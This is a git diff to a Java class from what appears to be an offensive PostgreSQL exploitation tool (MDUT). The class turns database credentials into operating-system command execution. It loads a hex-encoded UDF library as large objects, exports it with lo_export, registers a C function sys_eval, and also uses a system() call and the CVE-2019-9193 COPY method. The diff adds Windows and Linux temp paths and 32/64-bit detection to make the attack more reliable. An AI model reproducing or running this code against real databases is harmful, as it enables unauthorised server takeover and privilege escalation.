@@ -32,6 +32,8 @@ public class PostgreSqlDao {
 
     private Double versionNumber = null;
     private String systemplatform = "";
+    private String systemVersionNum = "";
+    private String systemTempPath = "";
     private String evalType = "";
     private String pluginFile = "";
 
@@ -41,15 +43,19 @@ public class PostgreSqlDao {
     private PostgreSqlController postgreSqlController = (PostgreSqlController) ControllersFactory.controllers.get(PostgreSqlController.class.getSimpleName());
 
 
+    public PostgreSqlDao() {
+
+    }
+
     public PostgreSqlDao(String ip, String port, String database, String username, String password, String timeout) throws Exception {
         // 从配置文件读取变量
         YamlConfigs configs = new YamlConfigs();
         Map<String, Object> yamlToMap = configs.getYamlToMap("config.yaml");
-        JARFILE = (String) configs.getValue("PostgreSql.Driver",yamlToMap);
-        JDBCURL = (String) configs.getValue("PostgreSql.JDBCUrl",yamlToMap);
-        DRIVER = (String) configs.getValue("PostgreSql.ClassName",yamlToMap);
+        JARFILE = (String) configs.getValue("PostgreSql.Driver", yamlToMap);
+        JDBCURL = (String) configs.getValue("PostgreSql.JDBCUrl", yamlToMap);
+        DRIVER = (String) configs.getValue("PostgreSql.ClassName", yamlToMap);
         //JDBCURL = JDBCURL + "?loginTimeout=" + timeout + "&socketTimeout=" + timeout;
-        JDBCURL = MessageFormat.format(JDBCURL, ip, port, database,timeout);
+        JDBCURL = MessageFormat.format(JDBCURL, ip, port, database, timeout);
         USERNAME = username;
         PASSWORD = password;
         // 动态加载
@@ -122,8 +128,9 @@ public class PostgreSqlDao {
             List<String> udfSplit = Utils.getStrList(udfHex, 4096);
 
             for (int i = 0; i < udfSplit.size(); i++) {
-                String injectex = String.format(injectStr, randomPIN, i, udfSplit.get(i));
-                PreparedStatement st = CONN.prepareStatement(injectex);
+                String injectHex = String.format(injectStr, randomPIN, i, udfSplit.get(i));
+//                System.out.println(injectex);
+                PreparedStatement st = CONN.prepareStatement(injectHex);
                 st.executeUpdate();
 
             }
@@ -146,14 +153,20 @@ public class PostgreSqlDao {
             // 写入udf
             injectUdf(randomPIN, pluginFile);
 
-            String sqlExport = "SELECT lo_export(" + randomPIN + ", '/tmp/." + randomPIN + ".so');";
+            String tempFile = systemTempPath + randomPIN + ".temp";
+
+            String sqlExport = "SELECT lo_export(" + randomPIN + "," + "'" + tempFile + "');";
+
+
             PreparedStatement st1 = CONN.prepareStatement(sqlExport);
             st1.execute();
+            Thread.sleep(1000);
 
-            String sqlFunc = "CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/." + randomPIN + ".so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;";
+            String sqlFunc = "CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '" + tempFile + "', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;";
             PreparedStatement st2 = CONN.prepareStatement(sqlFunc);
             st2.execute();
 
+            Thread.sleep(500);
             String sqlUnlink = "SELECT lo_unlink (" + randomPIN + ");";
             PreparedStatement st3 = CONN.prepareStatement(sqlUnlink);
             st3.execute();
@@ -163,17 +176,19 @@ public class PostgreSqlDao {
         }
     }
 
-    public String LowVersionEval(String command,String code) throws SQLException {
+    public String LowVersionEval(String command, String code) throws SQLException {
         try {
             String sql = "CREATE TABLE sectest111(t TEXT);";
             PreparedStatement st = CONN.prepareStatement(sql);
             st.executeUpdate();
 
-            String sql1 = "select system('" + command + "> /tmp/.postgre_system') as s;";
+            String tempFile = systemTempPath + "postgre_system";
+
+            String sql1 = "select system('" + command + "> " + tempFile + "') as s;";
             PreparedStatement st1 = CONN.prepareStatement(sql1);
             st1.executeQuery();
 
-            String tmpSql = "COPY sectest111 FROM '/tmp/.postgre_system';";
+            String tmpSql = "COPY sectest111 FROM '" + tempFile + "';";
             PreparedStatement st2 = CONN.prepareStatement(tmpSql);
             st2.executeUpdate();
 
@@ -184,7 +199,7 @@ public class PostgreSqlDao {
             StringBuilder resultStr = new StringBuilder();
 
             while (rs2.next()) {
-                resultStr.append(new String(rs2.getBytes(1),code));
+                resultStr.append(new String(rs2.getBytes(1), code));
                 resultStr.append("\n");
             }
             return resultStr.toString();
@@ -199,13 +214,13 @@ public class PostgreSqlDao {
         return "";
     }
 
-    public String udfEval(String command,String code) {
+    public String udfEval(String command, String code) {
         try {
             String resultSql = "select sys_eval('" + command + "');";
             PreparedStatement st = CONN.prepareStatement(resultSql);
             ResultSet rs = st.executeQuery();
             while (rs.next()) {
-                return new String(rs.getBytes(1),code);
+                return new String(rs.getBytes(1), code);
             }
         } catch (Exception e) {
             MessageUtil.showExceptionMessage(e, e.getMessage());
@@ -214,7 +229,7 @@ public class PostgreSqlDao {
     }
 
     // https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193
-    public String cveEval(String command,String code) throws SQLException {
+    public String cveEval(String command, String code) throws SQLException {
         try {
 
             // 单引号需要双写转义
@@ -242,7 +257,7 @@ public class PostgreSqlDao {
             StringBuilder resultStr = new StringBuilder();
 
             while (rs2.next()) {
-                resultStr.append(new String(rs2.getBytes(1),code));
+                resultStr.append(new String(rs2.getBytes(1), code));
                 resultStr.append("\n");
             }
             return resultStr.toString();
@@ -253,17 +268,17 @@ public class PostgreSqlDao {
         return null;
     }
 
-    public String eval(String command,String code) throws SQLException {
+    public String eval(String command, String code) throws SQLException {
         String result = "";
         switch (evalType) {
             case "low":
-                result = LowVersionEval(command,code);
+                result = LowVersionEval(command, code);
                 break;
             case "udf":
-                result = udfEval(command,code);
+                result = udfEval(command, code);
                 break;
             default:
-                result = cveEval(command,code);
+                result = cveEval(command, code);
         }
         return result;
     }
@@ -283,7 +298,7 @@ public class PostgreSqlDao {
 
     public void getInfo() {
         try {
-            List<String> wVersion = Arrays.asList("w64", "w32", "mingw", "visual studio");
+            List<String> wVersion = Arrays.asList("w64", "w32", "mingw", "visual studio", "Visual C++");
 
             String sql = "SELECT version() as v;";
 
@@ -296,10 +311,24 @@ public class PostgreSqlDao {
                 for (String str : wVersion) {
                     if (version.contains(str)) {
                         systemplatform = "windows";
+                        systemTempPath = "c:\\\\users\\\\public\\\\";
                         break;
                     }
                 }
-                systemplatform = "linux";
+
+                if ("".equals(systemplatform)) {
+                    systemplatform = "linux";
+                    systemTempPath = "/tmp/";
+                }
+
+                if (version.contains("32-bit")) {
+                    systemVersionNum = "32";
+                } else {
+                    systemVersionNum = "64";
+                }
+
+
+                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format("预判服务器类型：%s 服务器版本: %s", systemplatform, systemVersionNum)));
                 postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log(String.format("postgre版本：%s", version)));
             }
 
@@ -333,12 +362,12 @@ public class PostgreSqlDao {
             } else if (versionNumber > 8.2 && versionNumber < 9.3) {
                 evalType = "udf";
                 // 设置本地文件目录
-                String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "PostgreSql" + File.separator + versionNumber.toString() + ".txt";
-                pluginFile = Utils.readFile(path);
+                String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "PostgreSql" + File.separator + versionNumber.toString() + "_" + systemplatform + "_" + systemVersionNum + "_hex.txt";
+                pluginFile = Utils.readFile(path).replace("\n", "");
                 postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("版本可以尝试进行UDF提权"));
             } else if (versionNumber >= 9.3) {
                 evalType = "cve";
-                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("9.3以上版本默认使用 CVE-2019-9193,如失败请使用UDF提权"));
+                postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("9.3以上版本默认使用 CVE-2019-9193"));
             } else {
                 postgreSqlController.postgreSqlLogTextArea.appendText(Utils.log("该版本尚未编译UDF或无法提权"));
             }
@@ -348,7 +377,7 @@ public class PostgreSqlDao {
         }
     }
 
-//    public static void main(String[] args) {
+    public static void main(String[] args) {
 //        try {
 //            MysqlDao md = new MysqlDao("192.168.18.159","3306","mysql","root","root");
 //            System.out.println(testConnection());
@@ -356,5 +385,8 @@ public class PostgreSqlDao {
 //        } catch (Exception e) {
 //            e.printStackTrace();
 //        }
-//    }
+        PostgreSqlDao postgreSqlDao = new PostgreSqlDao();
+
+        postgreSqlDao.injectUdf(12359, Utils.readFile("/Users/wayne/code/java/tools/MDUT/MDAT-DEV/src/main/Plugins/PostgreSql/9.1_windows_32_hex.txt").replace("\n", ""));
+    }
 }
